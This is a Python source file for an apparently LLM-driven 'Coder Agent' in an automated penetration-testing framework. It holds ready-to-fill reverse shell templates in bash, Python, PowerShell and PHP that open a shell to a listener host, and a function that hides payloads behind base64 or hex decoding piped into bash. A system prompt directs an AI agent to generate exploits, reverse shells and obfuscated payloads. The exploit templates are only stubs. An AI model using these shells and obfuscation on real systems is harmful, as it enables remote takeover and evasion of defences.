"""
Coder Agent — Exploit and Payload Code Generation

Generates exploit code, reverse shells, custom payloads, and tool scripts
for penetration testing engagements across multiple programming languages.
"""

from __future__ import annotations

import logging
from enum import Enum
from typing import Any, Dict, List, Optional

from app.agent.agents import BaseAgent, MultiAgentState
from app.agent.state.agent_state import Phase
from app.agent.tools.tool_registry import ToolRegistry

logger = logging.getLogger(__name__)


class CodeType(str, Enum):
    """Types of code the CoderAgent can produce."""

    EXPLOIT = "exploit"
    REVERSE_SHELL = "reverse_shell"
    PAYLOAD = "payload"
    TOOL_SCRIPT = "tool_script"
    DECODER = "decoder"
    OBFUSCATED = "obfuscated"


class Language(str, Enum):
    """Supported programming languages."""

    PYTHON = "python"
    BASH = "bash"
    POWERSHELL = "powershell"
    C = "c"
    RUBY = "ruby"
    JAVA = "java"
    PHP = "php"
    JAVASCRIPT = "javascript"


class CoderAgent(BaseAgent):
    """
    Sub-agent specialised in security-oriented code generation and analysis.

    Generates exploit code, reverse shells, payload scripts, and tool
    automation across multiple languages for penetration testing.
    """

    AGENT_NAME = "coder"
    PREFERRED_TOOLS: List[str] = ["web_search", "searchsploit", "query_graph"]

    # Reverse shell templates keyed by language name
    REVERSE_SHELL_TEMPLATES: Dict[str, str] = {
        "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "powershell": (
            "$client=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
            "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};$client.Close()"
        ),
        "php": (
            "<?php $sock=fsockopen(\"{lhost}\",{lport});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>"
        ),
    }

    def __init__(
        self,
        registry: ToolRegistry,
        llm: Any = None,
        config: Optional[Dict[str, Any]] = None,
    ) -> None:
        super().__init__(registry, llm, config)

    # ------------------------------------------------------------------
    # BaseAgent interface
    # ------------------------------------------------------------------

    def get_phase(self) -> Phase:
        return Phase.EXPLOITATION

    def _build_system_prompt(self) -> str:
        tool_names = ", ".join(self.get_tool_names()) or "none"
        return (
            "You are the Coder Agent, an expert in security-oriented code "
            "generation for authorised penetration testing engagements.\n\n"
            "Your responsibilities:\n"
            "  1. Generate exploit code for identified vulnerabilities.\n"
            "  2. Create reverse shell scripts for multiple platforms.\n"
            "  3. Develop custom payloads and tool automation scripts.\n"
            "  4. Analyse code for vulnerabilities and risk levels.\n"
            "  5. Apply obfuscation techniques when required.\n\n"
            f"Available tools: {tool_names}.\n\n"
            "All code is for authorised penetration testing only.  Return "
            "structured output with code, language, description, and usage."
        )

    async def run(
        self, state: MultiAgentState, task: str
    ) -> Dict[str, Any]:
        """
        Generate code based on the task description.

        Args:
            state: Shared multi-agent state.
            task:  Code generation task description.

        Returns:
            ``{"agent": "coder", "code_type": str, "language": str,
               "code": str, "description": str, "usage": str}``
        """
        target_info = state.get("target_info") or {}
        logger.info("CoderAgent task: %s", task[:80])

        code_type = self._infer_code_type(task)
        language = self._infer_language(task)

        if code_type == CodeType.REVERSE_SHELL:
            lhost = str(target_info.get("lhost", "10.10.10.10"))
            lport = int(target_info.get("lport", 4444))
            result = self.generate_reverse_shell(
                os=target_info.get("os", "linux"),
                lhost=lhost,
                lport=lport,
                language=language,
            )
        elif code_type == CodeType.EXPLOIT:
            result = self.generate_exploit(
                vuln_type=task,
                target=target_info,
                language=language,
            )
        else:
            result = self._generate_tool_script(task, language)

        result["agent"] = self.AGENT_NAME
        result["code_type"] = code_type.value
        return result

    # ------------------------------------------------------------------
    # Domain-specific methods
    # ------------------------------------------------------------------

    def generate_exploit(
        self,
        vuln_type: str,
        target: Dict[str, Any],
        language: Language = Language.PYTHON,
    ) -> Dict[str, Any]:
        """
        Generate exploit code for the specified vulnerability type.

        Args:
            vuln_type: Vulnerability type (e.g. "sqli", "xss", "rce").
            target:    Target context dict (URL, IP, service).
            language:  Programming language to use.

        Returns:
            Dict with ``code``, ``language``, ``description``, ``usage``.
        """
        target_url = target.get("target", "http://target.example.com")

        if language == Language.PYTHON:
            code = self._python_exploit_template(vuln_type, target_url)
        elif language == Language.BASH:
            code = self._bash_exploit_template(vuln_type, target_url)
        else:
            code = self._python_exploit_template(vuln_type, target_url)

        return {
            "code": code,
            "language": language.value,
            "description": f"Exploit template for {vuln_type} vulnerability",
            "usage": f"python exploit.py  # Target: {target_url}",
        }

    def generate_reverse_shell(
        self,
        os: str,
        lhost: str,
        lport: int,
        language: Language = Language.BASH,
    ) -> Dict[str, Any]:
        """
        Generate a reverse shell command for the target OS and language.

        Args:
            os:       Target operating system ("linux", "windows", "macos").
            lhost:    Listener host IP address.
            lport:    Listener port number.
            language: Preferred shell language.

        Returns:
            Dict with ``code``, ``language``, ``description``, ``usage``.
        """
        lang_str = language.value if isinstance(language, Language) else str(language)
        template = self.REVERSE_SHELL_TEMPLATES.get(lang_str, self.REVERSE_SHELL_TEMPLATES["bash"])
        code = template.format(lhost=lhost, lport=lport)

        return {
            "code": code,
            "language": lang_str,
            "description": f"Reverse shell for {os} via {lang_str}",
            "usage": (
                f"Start listener: nc -lvnp {lport}\n"
                f"Execute on target: {code[:80]}..."
            ),
        }

    def analyze_code(
        self,
        code: str,
        language: Language,
    ) -> Dict[str, Any]:
        """
        Analyse code for vulnerabilities, dangerous functions, and risk level.

        Args:
            code:     Source code to analyse.
            language: Programming language of the code.

        Returns:
            Dict with ``vulnerabilities``, ``behavior``, ``risk_level``,
            ``dangerous_functions``.
        """
        lang_str = language.value if isinstance(language, Language) else str(language)

        dangerous_patterns: Dict[str, List[str]] = {
            "python": ["eval(", "exec(", "subprocess", "__import__", "os.system"],
            "php": ["eval(", "system(", "exec(", "shell_exec(", "passthru("],
            "javascript": ["eval(", "Function(", "setTimeout(", "innerHTML"],
            "bash": ["eval ", "curl|bash", "wget|sh", "base64 -d"],
        }

        patterns = dangerous_patterns.get(lang_str, [])
        found_dangerous = [p for p in patterns if p in code]

        risk_level = "High" if found_dangerous else "Low"
        if len(found_dangerous) >= 3:
            risk_level = "Critical"

        return {
            "vulnerabilities": found_dangerous,
            "behavior": self._infer_behavior(code, lang_str),
            "risk_level": risk_level,
            "dangerous_functions": found_dangerous,
            "language": lang_str,
            "line_count": len(code.splitlines()),
        }

    def obfuscate_payload(self, code: str, technique: str) -> str:
        """
        Apply basic obfuscation to a payload string.

        Args:
            code:      Code or command to obfuscate.
            technique: Obfuscation technique ("base64", "hex", "rot13").

        Returns:
            Obfuscated payload string.
        """
        import base64

        if technique == "base64":
            encoded = base64.b64encode(code.encode()).decode()
            return f"echo {encoded} | base64 -d | bash"
        elif technique == "hex":
            hex_encoded = code.encode().hex()
            return f"echo {hex_encoded} | xxd -r -p | bash"
        elif technique == "rot13":
            return code.translate(
                str.maketrans(
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                    "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
                )
            )
        return code

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _python_exploit_template(self, vuln_type: str, target: str) -> str:
        return (
            f"#!/usr/bin/env python3\n"
            f'"""\nExploit: {vuln_type}\nTarget: {target}\n"""\n\n'
            f"import requests\n\n"
            f"TARGET = '{target}'\n\n"
            f"def exploit():\n"
            f"    # TODO: implement {vuln_type} exploit\n"
            f"    r = requests.get(TARGET)\n"
            f"    print(f'Status: {{r.status_code}}')\n\n"
            f"if __name__ == '__main__':\n"
            f"    exploit()\n"
        )

    def _bash_exploit_template(self, vuln_type: str, target: str) -> str:
        return (
            f"#!/bin/bash\n"
            f"# Exploit: {vuln_type}\n"
            f"# Target: {target}\n\n"
            f"TARGET='{target}'\n\n"
            f"# TODO: implement {vuln_type} exploit\n"
            f'curl -s "$TARGET"\n'
        )

    def _generate_tool_script(self, task: str, language: Language) -> Dict[str, Any]:
        code = f"#!/usr/bin/env {language.value}\n# Tool script for: {task}\n# TODO: implement\n"
        return {
            "code": code,
            "language": language.value,
            "description": f"Tool script for: {task}",
            "usage": f"Run with {language.value}",
        }

    def _infer_code_type(self, task: str) -> CodeType:
        task_lower = task.lower()
        if "reverse shell" in task_lower or "revshell" in task_lower:
            return CodeType.REVERSE_SHELL
        if "exploit" in task_lower:
            return CodeType.EXPLOIT
        if "payload" in task_lower:
            return CodeType.PAYLOAD
        if "decode" in task_lower:
            return CodeType.DECODER
        if "obfuscat" in task_lower:
            return CodeType.OBFUSCATED
        return CodeType.TOOL_SCRIPT

    def _infer_language(self, task: str) -> Language:
        task_lower = task.lower()
        if "powershell" in task_lower:
            return Language.POWERSHELL
        if "bash" in task_lower or "shell" in task_lower:
            return Language.BASH
        if "php" in task_lower:
            return Language.PHP
        if "ruby" in task_lower:
            return Language.RUBY
        if "java" in task_lower and "javascript" not in task_lower:
            return Language.JAVA
        if "javascript" in task_lower or "js" in task_lower:
            return Language.JAVASCRIPT
        return Language.PYTHON

    def _infer_behavior(self, code: str, language: str) -> str:
        """Return a brief description of what the code appears to do."""
        code_lower = code.lower()
        behaviors: List[str] = []
        if "socket" in code_lower or "connect" in code_lower:
            behaviors.append("network connection")
        if "subprocess" in code_lower or "system(" in code_lower or "exec(" in code_lower:
            behaviors.append("command execution")
        if "open(" in code_lower or "file" in code_lower:
            behaviors.append("file access")
        if "base64" in code_lower:
            behaviors.append("encoding/decoding")
        return ", ".join(behaviors) if behaviors else "general script execution"


__all__ = ["CoderAgent", "CodeType", "Language"]
